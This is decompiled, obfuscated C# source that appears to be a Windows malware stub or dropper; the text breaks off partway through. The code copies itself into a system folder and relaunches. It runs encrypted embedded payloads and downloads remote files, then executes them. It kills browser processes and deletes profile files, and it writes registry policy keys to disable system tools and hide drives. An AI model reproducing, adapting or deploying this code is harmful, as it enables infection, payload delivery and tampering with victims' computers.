using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class0
{
	private static Class14 class14_0 = new Class14();

	private static Class1.Class2 class2_0 = new Class1.Class2();

	private static Class1.Class3 class3_0 = new Class1.Class3();

	private static Class1.Class4 class4_0 = new Class1.Class4();

	private static Class1.Class5 class5_0 = new Class1.Class5();

	private static Class1.Class6 class6_0 = new Class1.Class6();

	private static Class1.Class7 class7_0 = new Class1.Class7();

	private static Class1.Class8 class8_0 = new Class1.Class8();

	private static Class1.Class9 class9_0 = new Class1.Class9();

	private static Class1.Class10 class10_0 = new Class1.Class10();

	private static Class1.Class11 class11_0 = new Class1.Class11();

	[CompilerGenerated]
	private static WaitCallback waitCallback_0;

	[CompilerGenerated]
	private static WaitCallback waitCallback_1;

	[CompilerGenerated]
	private static WaitCallback waitCallback_2;

	[CompilerGenerated]
	private static WaitCallback waitCallback_3;

	[CompilerGenerated]
	private static WaitCallback waitCallback_4;

	[CompilerGenerated]
	private static WaitCallback waitCallback_5;

	[CompilerGenerated]
	private static WaitCallback waitCallback_6;

	[CompilerGenerated]
	private static WaitCallback waitCallback_7;

	[CompilerGenerated]
	private static WaitCallback waitCallback_8;

	[CompilerGenerated]
	private static WaitCallback waitCallback_9;

	[CompilerGenerated]
	private static WaitCallback waitCallback_10;

	[CompilerGenerated]
	private static WaitCallback waitCallback_11;

	[CompilerGenerated]
	private static WaitCallback waitCallback_12;

	[CompilerGenerated]
	private static WaitCallback waitCallback_13;

	[CompilerGenerated]
	private static WaitCallback waitCallback_14;

	[CompilerGenerated]
	private static WaitCallback waitCallback_15;

	[CompilerGenerated]
	private static WaitCallback waitCallback_16;

	[CompilerGenerated]
	private static WaitCallback waitCallback_17;

	[CompilerGenerated]
	private static WaitCallback waitCallback_18;

	[CompilerGenerated]
	private static WaitCallback waitCallback_19;

	[CompilerGenerated]
	private static WaitCallback waitCallback_20;

	[CompilerGenerated]
	private static WaitCallback waitCallback_21;

	[CompilerGenerated]
	private static WaitCallback waitCallback_22;

	[CompilerGenerated]
	private static WaitCallback waitCallback_23;

	[CompilerGenerated]
	private static WaitCallback waitCallback_24;

	[CompilerGenerated]
	private static WaitCallback waitCallback_25;

	[CompilerGenerated]
	private static WaitCallback waitCallback_26;

	private static void Main(string[] args)
	{
		class14_0.Event_0 += smethod_0;
		class14_0.method_0();
		class4_0.Timer_0.add_Tick((EventHandler)smethod_1);
		if (class5_0.Boolean_0)
		{
			if (Application.get_StartupPath() != Environment.GetFolderPath(class5_0.SpecialFolder_0))
			{
				switch (class5_0.Boolean_1)
				{
				case false:
					try
					{
						Class12.smethod_5(class5_0.String_0, Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("_", 3) + class5_0.String_2);
						File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("]", 1) + class5_0.String_2, overwrite: true);
						Process process = new Process();
						process.StartInfo = new ProcessStartInfo
						{
							Arguments = _003CModule_003E.smethod_0("KJGA", 4),
							FileName = Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("_", 3) + class5_0.String_2
						};
						process.Start();
						Process.GetCurrentProcess().Kill();
					}
					catch (Exception ex2)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\fC~ecvroih&ieestcb&.Kgoh/<&}6{", 6), ex2.Message));
					}
					break;
				case true:
					try
					{
						Class12.smethod_5(class5_0.String_0, Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("]", 1) + class5_0.String_2);
						Class12.smethod_3(Environment.GetFolderPath(class5_0.SpecialFolder_0) + _003CModule_003E.smethod_0("\\", 0) + class5_0.String_2, _003CModule_003E.smethod_0("MLAG", 2));
					}
					catch (Exception ex)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\rB\u007fdbwsnhi'hddrubc'/Jfni.='|7z", 7), ex.Message));
					}
					break;
				}
			}
			else
			{
				if (args.Length > 0 && args[0] == _003CModule_003E.smethod_0("MLAG", 2))
				{
					if (class7_0.Boolean_0 & class7_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							Class12.smethod_0<Class1.Class7.Delegate1>(_003CModule_003E.smethod_0("፯፩\u137f፨ጩጨጠፗ\u137f፩፩፻\u137d\u137fፘ፵።\u135b", 4890))(IntPtr.Zero, class7_0.String_1, class7_0.String_0, class7_0.Int32_0);
						});
					}
					if (class9_0.Boolean_0 & class9_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							ResourceManager resourceManager3 = new ResourceManager(class9_0.String_0, Assembly.GetExecutingAssembly());
							ResourceSet resourceSet3 = resourceManager3.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
							foreach (DictionaryEntry item in resourceSet3)
							{
								try
								{
									byte[] array3 = Class12.smethod_14(Encoding.Default.GetBytes(resourceSet3.GetObject(item.Key.ToString())!.ToString()), Encoding.Default.GetBytes(class9_0.String_1));
									using (FileStream fileStream3 = new FileStream(Path.GetTempPath() + item.Key.ToString(), FileMode.Create))
									{
										fileStream3.Write(array3, 0, array3.Length);
										fileStream3.Close();
									}
									Process.Start(Path.GetTempPath() + item.Key);
								}
								catch (Exception ex25)
								{
									Console.WriteLine(string.Format(_003CModule_003E.smethod_0("╎━┼┧┡┴┰┭┫┪╤┫┧┧┱┶┡┠╤╬┉┥┭┪╭╾╤┿╴┹", 9540), ex25.Message));
								}
							}
						});
					}
					if (class10_0.Boolean_0 & class10_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							try
							{
								string text3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("ɖɇɥɰɣɦɦɫɖɌɣɸɯɬɥɲɖɚɸɥɬɣɦɯɹ", 522);
								DirectoryInfo directoryInfo5 = new DirectoryInfo(text3);
								DirectoryInfo[] directories3 = directoryInfo5.GetDirectories();
								foreach (DirectoryInfo directoryInfo6 in directories3)
								{
									if (File.Exists(string.Concat(text3, _003CModule_003E.smethod_0("ᵻ", 7463), directoryInfo6, _003CModule_003E.smethod_0("\u0ddd\u0de2෮෮෪෨\u0de4\u0df2ද\u0df2\u0df0෭෨\u0df5\u0de4", 3457))))
									{
										Process[] processesByName11 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᦔᦛᦀᦗᦔᦝᦊ", 6642));
										foreach (Process process16 in processesByName11)
										{
											process16.Kill();
											process16.WaitForExit();
										}
										Process[] processesByName12 = Process.GetProcessesByName(_003CModule_003E.smethod_0("┅┙─┒├┛╘┖┚┛━└├┛┐┇", 9589));
										foreach (Process process17 in processesByName12)
										{
											process17.Kill();
											process17.WaitForExit();
										}
										File.Delete(string.Concat(text3, _003CModule_003E.smethod_0("\u0320", 892), directoryInfo6, _003CModule_003E.smethod_0("ᦥᦚᦖᦖᦒᦐᦜᦊ᧗ᦊᦈᦕᦐᦍᦜ", 6649)));
									}
								}
							}
							catch (Exception ex24)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ŦĩĔďĉĜĘąăĂŌăďďęĞĉĈŌńġčąĂŅŖŌėŜđ", 364), ex24.Message));
							}
						});
					}
					if (class10_0.Boolean_3 & class10_0.Boolean_4)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							Class21.smethod_2(class10_0.String_0);
							try
							{
								Process[] processesByName9 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u02d2\u02ddˆˑ\u02d2\u02dbˌ", 692));
								foreach (Process process14 in processesByName9)
								{
									process14.Kill();
								}
								Process[] processesByName10 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ǓǏǖǄǊǍƎǀǌǍǗǂǊǍǆǑ", 419));
								foreach (Process process15 in processesByName10)
								{
									process15.Kill();
								}
							}
							catch (Exception ex23)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᣠ\u18afᢒᢉᢏᢚᢞᢃ\u1885ᢄᣊ\u1885ᢉᢉᢟᢘᢏᢎᣊᣂᢧᢋᢃᢄᣃᣐᣊᢑᣚᢗ", 6378), ex23.Message));
							}
						});
					}
					if (class8_0.Boolean_0 & class8_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							foreach (string item2 in class8_0.List_0)
							{
								try
								{
									Process process13 = new Process
									{
										StartInfo = new ProcessStartInfo
										{
											FileName = item2,
											UseShellExecute = true
										}
									};
									process13.Start();
								}
								catch (Exception ex22)
								{
									Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0a0d\u0a42\u0a7f\u0a64\u0a62\u0a77ੳ੮੨੩ਧ੨\u0a64\u0a64ੲ\u0a75\u0a62\u0a63ਧਯ\u0a4a੦੮੩ਮ\u0a3dਧ\u0a7c\u0a37\u0a7a", 2567), ex22.Message));
								}
							}
						});
					}
					if (class6_0.Boolean_0 & class6_0.Boolean_1)
					{
						ThreadPool.QueueUserWorkItem(delegate
						{
							WebClient webClient3 = new WebClient();
							foreach (string item3 in class6_0.List_0)
							{
								try
								{
									string fileName3 = Path.GetTempPath() + _003CModule_003E.smethod_0("\u0b80", 3036) + Class12.smethod_6(5, 10) + item3.Substring(item3.LastIndexOf('.'));
									webClient3.DownloadFile(item3, fileName3);
									Process.Start(fileName3);
								}
								catch (Exception ex21)
								{
									Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ℐ⅟ⅢⅹⅿⅪⅮⅳⅵⅴ℺ⅵⅹⅹⅯⅨⅿⅾ℺Ⅎ⅗ⅻⅳⅴℳ℠℺ⅡKⅧ", 8474), ex21.Message));
								}
							}
						});
					}
				}
				if (class7_0.Boolean_0 & !class7_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						Class12.smethod_0<Class1.Class7.Delegate1>(_003CModule_003E.smethod_0("\u0a43\u0a45\u0a53\u0a44ਅ\u0a04\u0a0c\u0a7b\u0a53\u0a45\u0a45\u0a57\u0a51\u0a53ੴਖ਼\u0a4e\u0a77", 2614))(IntPtr.Zero, class7_0.String_1, class7_0.String_0, class7_0.Int32_0);
					});
				}
				if (class9_0.Boolean_0 & !class9_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						ResourceManager resourceManager2 = new ResourceManager(class9_0.String_0, Assembly.GetExecutingAssembly());
						ResourceSet resourceSet2 = resourceManager2.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
						foreach (DictionaryEntry item4 in resourceSet2)
						{
							try
							{
								byte[] array2 = Class12.smethod_14(Encoding.Default.GetBytes(resourceSet2.GetObject(item4.Key.ToString())!.ToString()), Encoding.Default.GetBytes(class9_0.String_1));
								using (FileStream fileStream2 = new FileStream(Path.GetTempPath() + item4.Key.ToString(), FileMode.Create))
								{
									fileStream2.Write(array2, 0, array2.Length);
									fileStream2.Close();
								}
								Process.Start(Path.GetTempPath() + item4.Key);
							}
							catch (Exception ex20)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ಙ\u0cd6೫\u0cf0\u0cf6\u0ce3೧\u0cfa\u0cfc\u0cfdಳ\u0cfc\u0cf0\u0cf0೦ೡ\u0cf6\u0cf7ಳ\u0cbbೞೲ\u0cfa\u0cfd\u0cba\u0ca9ಳ೨ಣ೮", 3219), ex20.Message));
							}
						}
					});
				}
				if (class10_0.Boolean_0 & !class10_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						try
						{
							string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("ሟሎሬሹሪሯሯሢሟህሪሱሦሥሬሻሟሓሱሬሥሪሯሦሰ", 4675);
							DirectoryInfo directoryInfo3 = new DirectoryInfo(text2);
							DirectoryInfo[] directories2 = directoryInfo3.GetDirectories();
							foreach (DirectoryInfo directoryInfo4 in directories2)
							{
								if (File.Exists(string.Concat(text2, _003CModule_003E.smethod_0("\u0bdc", 2944), directoryInfo4, _003CModule_003E.smethod_0("ফঔঘঘজঞ\u0992\u0984\u09d9\u0984আছঞ\u0983\u0992", 2551))))
								{
									Process[] processesByName7 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u064dق\u0659\u064e\u064dل\u0653", 1579));
									foreach (Process process11 in processesByName7)
									{
										process11.Kill();
										process11.WaitForExit();
									}
									Process[] processesByName8 = Process.GetProcessesByName(_003CModule_003E.smethod_0("फ़\u0942ज़\u0949\u0947\u0940\u0903\u094d\u0941\u0940ग़\u094f\u0947\u0940\u094bड़", 2350));
									foreach (Process process12 in processesByName8)
									{
										process12.Kill();
										process12.WaitForExit();
									}
									File.Delete(string.Concat(text2, _003CModule_003E.smethod_0("ᝡ", 5949), directoryInfo4, _003CModule_003E.smethod_0("\u0963ड़ॐॐ\u0954\u0956ग़\u094cऑ\u094c\u094e\u0953\u0956\u094bग़", 2367)));
								}
							}
						}
						catch (Exception ex19)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ҴӻӆӝӛӎӊӗӑӐҞӑӝӝӋӌӛӚҞҖӳӟӗӐҗ\u0484ҞӅҎӃ", 1214), ex19.Message));
						}
					});
				}
				if (class10_0.Boolean_3 & !class10_0.Boolean_4)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						Class21.smethod_2(class10_0.String_0);
						try
						{
							Process[] processesByName5 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᕢᕭᕶᕡᕢᕫᕼ", 5380));
							foreach (Process process9 in processesByName5)
							{
								process9.Kill();
							}
							Process[] processesByName6 = Process.GetProcessesByName(_003CModule_003E.smethod_0("⌰⌬⌵⌧〈⌮⍭⌣⌯⌮⌴⌡〈⌮⌥⌲", 9024));
							foreach (Process process10 in processesByName6)
							{
								process10.Kill();
							}
						}
						catch (Exception ex18)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u243a⑵⑈\u2453\u2455⑀⑄\u2459\u245f\u245e␐\u245f\u2453\u2453⑅⑂\u2455\u2454␐␘⑽\u2451\u2459\u245e␙␊␐\u244b␀\u244d", 9264), ex18.Message));
						}
					});
				}
				if (class6_0.Boolean_0 & !class6_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						WebClient webClient2 = new WebClient();
						foreach (string item5 in class6_0.List_0)
						{
							try
							{
								string fileName2 = Path.GetTempPath() + _003CModule_003E.smethod_0("ừ", 7863) + Class12.smethod_6(5, 10) + item5.Substring(item5.LastIndexOf('.'));
								webClient2.DownloadFile(item5, fileName2);
								Process.Start(fileName2);
							}
							catch (Exception ex17)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("भ\u0962य़\u0944\u0942\u0957\u0953\u094e\u0948\u0949इ\u0948\u0944\u0944\u0952\u0955\u0942\u0943इए४\u0946\u094e\u0949ऎझइड़गग़", 2343), ex17.Message));
							}
						}
					});
				}
				if (class8_0.Boolean_0 & !class8_0.Boolean_1)
				{
					ThreadPool.QueueUserWorkItem(delegate
					{
						foreach (string item6 in class8_0.List_0)
						{
							try
							{
								Process process8 = new Process
								{
									StartInfo = new ProcessStartInfo
									{
										FileName = item6,
										UseShellExecute = true
									}
								};
								process8.Start();
							}
							catch (Exception ex16)
							{
								Console.WriteLine(string.Format(_003CModule_003E.smethod_0("⏅⎊⎷⎬⎪⎿⎻⎦⎠⎡⏯⎠⎬⎬⎺⎽⎪⎫⏯⏧⎂⎮⎦⎡⏦⏵⏯⎴⏿⎲", 9167), ex16.Message));
							}
						}
					});
				}
			}
		}
		else
		{
			if (class7_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					Class12.smethod_0<Class1.Class7.Delegate1>(_003CModule_003E.smethod_0("ݗݑ\u0747ݐ\u0711ܐܘݯ\u0747ݑݑ\u0743\u0745\u0747ݠݍݚݣ", 1826))(IntPtr.Zero, class7_0.String_1, class7_0.String_0, class7_0.Int32_0);
				});
			}
			if (class9_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					ResourceManager resourceManager = new ResourceManager(class9_0.String_0, Assembly.GetExecutingAssembly());
					ResourceSet resourceSet = resourceManager.GetResourceSet(CultureInfo.CurrentCulture, createIfNotExists: true, tryParents: true);
					foreach (DictionaryEntry item7 in resourceSet)
					{
						try
						{
							byte[] array = Class12.smethod_14(Encoding.Default.GetBytes(resourceSet.GetObject(item7.Key.ToString())!.ToString()), Encoding.Default.GetBytes(class9_0.String_1));
							using (FileStream fileStream = new FileStream(Path.GetTempPath() + item7.Key.ToString(), FileMode.Create))
							{
								fileStream.Write(array, 0, array.Length);
								fileStream.Close();
							}
							Process process7 = new Process
							{
								StartInfo = new ProcessStartInfo
								{
									FileName = Path.GetTempPath() + item7.Key,
									UseShellExecute = true
								}
							};
							process7.Start();
						}
						catch (Exception ex15)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᙻᘴᘉᘒᘔᘁᘅᘘᘞᘟᙑᘞᘒᘒᘄᘃᘔᘕᙑᙙᘼᘐᘘᘟᙘᙋᙑᘊᙁᘌ", 5745), ex15.Message));
						}
					}
				});
			}
			if (class10_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					try
					{
						string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CModule_003E.smethod_0("\u0e6f\u0e7e\u0e5c\u0e49๚\u0e5f\u0e5f๒\u0e6f\u0e75๚แ๖๕\u0e5c\u0e4b\u0e6f\u0e63แ\u0e5c๕๚\u0e5f๖เ", 3635);
						DirectoryInfo directoryInfo = new DirectoryInfo(text);
						DirectoryInfo[] directories = directoryInfo.GetDirectories();
						foreach (DirectoryInfo directoryInfo2 in directories)
						{
							if (File.Exists(string.Concat(text, _003CModule_003E.smethod_0("\u1ad0", 6796), directoryInfo2, _003CModule_003E.smethod_0("ọỲỾỾỺỸỴỢếỢỠỽỸụỴ", 7825))))
							{
								Process[] processesByName3 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ᙣᙬᙷᙠᙣᙪᙽ", 5637));
								foreach (Process process5 in processesByName3)
								{
									process5.Kill();
									process5.WaitForExit();
								}
								Process[] processesByName4 = Process.GetProcessesByName(_003CModule_003E.smethod_0("\u089c\u0880\u0899\u088b\u0885\u0882ࣁ\u088f\u0883\u0882\u0898\u088d\u0885\u0882\u0889\u089e", 2284));
								foreach (Process process6 in processesByName4)
								{
									process6.Kill();
									process6.WaitForExit();
								}
								File.Delete(string.Concat(text, _003CModule_003E.smethod_0("ሳ", 4719), directoryInfo2, _003CModule_003E.smethod_0("ƏưƼƼƸƺƶƠǽƠƢƿƺƧƶ", 467)));
							}
						}
					}
					catch (Exception ex14)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ͺ\u0335\u0308\u0313\u0315\u0300\u0304\u0319\u031f\u031e\u0350\u031f\u0313\u0313\u0305\u0302\u0315\u0314\u0350\u0358\u033d\u0311\u0319\u031e\u0359\u034a\u0350\u030b\u0340\u030d", 880), ex14.Message));
					}
				});
			}
			if (class10_0.Boolean_3)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					Class21.smethod_2(class10_0.String_0);
					try
					{
						Process[] processesByName = Process.GetProcessesByName(_003CModule_003E.smethod_0("⒨⒧Ⓖ⒫⒨⒡Ⓐ", 9422));
						foreach (Process process3 in processesByName)
						{
							process3.Kill();
						}
						Process[] processesByName2 = Process.GetProcessesByName(_003CModule_003E.smethod_0("ႩႵႬႾႰႷჴႺႶႷႭႸႰႷႼႫ", 4313));
						foreach (Process process4 in processesByName2)
						{
							process4.Kill();
						}
					}
					catch (Exception ex13)
					{
						Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u0abf૰\u0acd\u0ad6ૐ\u0ac5\u0ac1\u0adc\u0ada\u0adbક\u0ada\u0ad6\u0ad6\u0ac0\u0ac7ૐ\u0ad1કઝ\u0af8\u0ad4\u0adc\u0adbજએક\u0aceઅ\u0ac8", 2741), ex13.Message));
					}
				});
			}
			if (class6_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					WebClient webClient = new WebClient();
					foreach (string item8 in class6_0.List_0)
					{
						try
						{
							string fileName = Path.GetTempPath() + _003CModule_003E.smethod_0("ߡ", 1981) + Class12.smethod_6(5, 10) + item8.Substring(item8.LastIndexOf('.'));
							webClient.DownloadFile(item8, fileName);
							Process.Start(fileName);
						}
						catch (Exception ex12)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ὛἔἩἲἴἡἥἸἾἿάἾἲἲἤἣἴἵάόἜἰἸἿὸὫάἪὡἬ", 8017), ex12.Message));
						}
					}
				});
			}
			if (class8_0.Boolean_0)
			{
				ThreadPool.QueueUserWorkItem(delegate
				{
					foreach (string item9 in class8_0.List_0)
					{
						try
						{
							Process process2 = new Process
							{
								StartInfo = new ProcessStartInfo
								{
									FileName = item9,
									UseShellExecute = true
								}
							};
							process2.Start();
						}
						catch (Exception ex11)
						{
							Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ᝌᜃ\u173eᜥᜣ᜶\u1732ᜯᜩᜨᝦᜩᜥᜥ\u1733\u1734ᜣᜢᝦᝮᜋᜧᜯᜨᝯ\u177cᝦ\u173d\u1776\u173b", 5958), ex11.Message));
						}
					}
				});
			}
		}
		if (class11_0.Boolean_0)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey11 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ʼʀʉʛʘʎʝʊʳʿʀʃʆʌʆʊʜʳʢʆʌʝʀʜʀʉʛʳʸʆʁʋʀʘʜʳʼʖʜʛʊʂ", 751));
					registryKey11.SetValue(_003CModule_003E.smethod_0("ᓂᓯᓵᓧᓤᓪᓣᓅᓋᓂ", 5254), 1);
					registryKey11.Close();
				}
				catch (Exception ex10)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("\u07ecޣޞޅރޖޒޏމވ߆މޅޅޓޔރނ߆ߎ\u07abއޏވߏߜ߆ޝߖޛ", 2022), ex10.Message));
				}
			});
		}
		if (class11_0.Boolean_1)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey10 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ኡኝኔኆኅናኀኗኮ\u12bfኛኑኀኝኁኝኔኆኮእኛኜኖኝኅኁኮ\u12b1ኇኀኀኗኜኆኤኗኀኁኛኝኜኮኢኝኞኛኑኛኗኁኮኡኋኁኆኗኟ", 4850));
					registryKey10.SetValue(_003CModule_003E.smethod_0("๓\u0e7e\u0e64\u0e76\u0e75\u0e7b\u0e72ใ\u0e76\u0e64\u0e7c๚\u0e70\u0e65", 3607), 1);
					registryKey10.Close();
				}
				catch (Exception ex9)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("⛮⚡⚜⚇⚁⚔⚐⚍⚋⚊⛄⚋⚇⚇⚑⚖⚁⚀⛄⛌⚩⚅⚍⚊⛍⛞⛄⚟⛔⚙", 9956), ex9.Message));
				}
			});
		}
		if (class11_0.Boolean_2)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					RegistryKey registryKey9 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("ᦙᦥ\u19acᦾᦽᦫᦸ\u19afᦖᦇᦣᦩᦸᦥᦹᦥ\u19acᦾᦖᦝᦣᦤ\u19aeᦥᦽᦹᦖᦉᦿᦸᦸ\u19afᦤᦾᦜ\u19afᦸᦹᦣᦥᦤᦖᦚᦥᦦᦣᦩᦣ\u19afᦹᦖᦙᦳᦹᦾ\u19afᦧ", 6602));
					registryKey9.SetValue(_003CModule_003E.smethod_0("ἽἐἊἘἛἕἜἫἜ\u1f1eἐἊἍἋἀἭ\u1f16\u1f16ἕἊ", 8057), 1);
					registryKey9.Close();
				}
				catch (Exception ex8)
				{
					Console.WriteLine(string.Format(_003CModule_003E.smethod_0("ι\u1ff1ῌῗῑῄ\u1fc0\u1fddΊῚᾔΊῗῗ\u1fc1ῆῑῐᾔᾜΌ\u1fd5\u1fddῚᾝᾎᾔ\u1fcfᾄΈ", 8116), ex8.Message));
				}
			});
		}
		if (class11_0.Boolean_3)
		{
			ThreadPool.QueueUserWorkItem(delegate
			{
				try
				{
					string pathRoot = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
					pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("筼", 162630), string.Empty);
					pathRoot = pathRoot.Replace(_003CModule_003E.smethod_0("\u1bf7", 662443), string.Empty);
					int num = 0;
					string key;
					if ((key = pathRoot) != null)
					{
						if (_003CPrivateImplementationDetails_003E_007BBFDAA99F_002D1C6B_002D4B22_002DB790_002D8AF89B0BC2E0_007D.dictionary_0 == null)
						{
							_003CPrivateImplementationDetails_003E_007BBFDAA99F_002D1C6B_002D4B22_002DB790_002D8AF89B0BC2E0_007D.dictionary_0 = new Dictionary<string, int>(26)
							{
								{
									_003CModule_003E.smethod_0("碯", 555246),
									0
								},
								{
									_003CModule_003E.smethod_0("샫", 377001),
									1
								},
								{
									_003CModule_003E.smethod_0("\u0fb6", 724981),
									2
								},
								{
									_003CModule_003E.smethod_0("\ue7c6", 59266),
									3
								},
								{
									_003CModule_003E.smethod_0("⛀", 75397),
									4
								},
								{
									_003CModule_003E.smethod_0("ﳾ", 851128),
									5
								},
								{
									_003CModule_003E.smethod_0("쏧", 770976),
									6
								},
								{
									_003CModule_003E.smethod_0("\ufffd", 842746),
									7
								},
								{
									_003CModule_003E.smethod_0("Ύ", 597922),
									8
								},
								{
									_003CModule_003E.smethod_0("尕", 613471),
									9
								},
								{
									_003CModule_003E.smethod_0("樀", 289355),
									10
								},
								{
									_003CModule_003E.smethod_0("\u0c73", 789567),
									11
								},
								{
									_003CModule_003E.smethod_0("쇕", 770456),
									12
								},
								{
									_003CModule_003E.smethod_0("訲", 952956),
									13
								},
								{
									_003CModule_003E.smethod_0("杣", 485164),
									14
								},
								{
									_003CModule_003E.smethod_0("롡", 702513),
									15
								},
								{
									_003CModule_003E.smethod_0("Ε", 263108),
									16
								},
								{
									_003CModule_003E.smethod_0("⚛", 75465),
									17
								},
								{
									_003CModule_003E.smethod_0("╎", 402717),
									18
								},
								{
									_003CModule_003E.smethod_0("뷝", 48521),
									19
								},
								{
									_003CModule_003E.smethod_0("㖓", 734662),
									20
								},
								{
									_003CModule_003E.smethod_0("\ufffd", 56566),
									21
								},
								{
									_003CModule_003E.smethod_0("ꈘ", 959055),
									22
								},
								{
									_003CModule_003E.smethod_0("겪", 306418),
									23
								},
								{
									_003CModule_003E.smethod_0("夯", 874870),
									24
								},
								{
									_003CModule_003E.smethod_0("길", 372322),
									25
								}
							};
						}
						if (_003CPrivateImplementationDetails_003E_007BBFDAA99F_002D1C6B_002D4B22_002DB790_002D8AF89B0BC2E0_007D.dictionary_0.TryGetValue(key, out var value))
						{
							switch (value)
							{
							case 0:
								break;
							case 1:
								goto IL_0342;
							case 2:
								goto IL_0349;
							case 3:
								goto IL_0350;
							case 4:
								goto IL_0357;
							case 5:
								goto IL_035f;
							case 6:
								goto IL_0367;
							case 7:
								goto IL_036f;
							case 8:
								goto IL_037a;
							case 9:
								goto IL_0385;
							case 10:
								goto IL_0390;
							case 11:
								goto IL_0398;
							case 12:
								goto IL_03a0;
							case 13:
								goto IL_03a8;
							case 14:
								goto IL_03b0;
							case 15:
								goto IL_03b8;
							case 16:
								goto IL_03c0;
							case 17:
								goto IL_03c8;
							case 18:
								goto IL_03d0;
							case 19:
								goto IL_03d8;
							case 20:
								goto IL_03e0;
							case 21:
								goto IL_03e8;
							case 22:
								goto IL_03f0;
							case 23:
								goto IL_03f8;
							case 24:
								goto IL_0400;
							case 25:
								goto IL_0408;
							default:
								goto IL_0410;
							}
							num = 1;
							goto IL_0412;
						}
					}
					goto IL_0410;
					IL_0349:
					num = 4;
					goto IL_0412;
					IL_0412:
					RegistryKey registryKey8 = Registry.CurrentUser.CreateSubKey(_003CModule_003E.smethod_0("䀿䀃䀊䀘䀛䀍䀞䀉䀰䀡䀅䀏䀞䀃䀟䀃䀊䀘䀰䀻䀅䀂䀈䀃䀛䀟䀰䀯䀙䀞䀞䀉䀂䀘䀺䀉䀞䀟䀅䀃䀂䀰䀼䀃䀀䀅䀏䀅䀉䀟䀰䀩䀔䀜䀀䀃䀞䀉䀞", 475244));
					registryKey8.SetValue(_003CModule_003E.smethod_0("㴾㴟㴴㴂㴙㴆㴕㴃", 277872), num);
					registryKey8.SetValue(_003CModule_003E.smethod_0("\ue00a\ue02b\ue012\ue02d\ue021\ue033\ue00b\ue02a\ue000\ue036\ue02d\ue032\ue021", 974916), num);
					registryKey8.Close();
					return;
					IL_0342:
					num = 2;
					goto IL_0412;
					IL_0410:
					num = 4;
					goto IL_0412;
					IL_0408:
					num = 33554432;
					goto IL_0412;
					IL_0400:
					num = 16777216;
					goto IL_0412;
					IL_03f8:
					num = 8388608;
					goto IL_0412;
					IL_03f0:
					num = 4194304;
					goto IL_0412;
					IL_03e8:
					num = 2097152;
					goto IL_0412;
					IL_03e0:
					num = 1048576;
					goto IL_0412;
					IL_03d8:
					num = 524288;
					goto IL_0412;
					IL_03d0:
					num = 262144;
					goto IL_0412;
					IL_03c8:
					num = 131072;
					goto IL_0412;
					IL_03c0:
					num = 65536;
					goto IL_0412;
					IL_03b8:
					num = 32768;
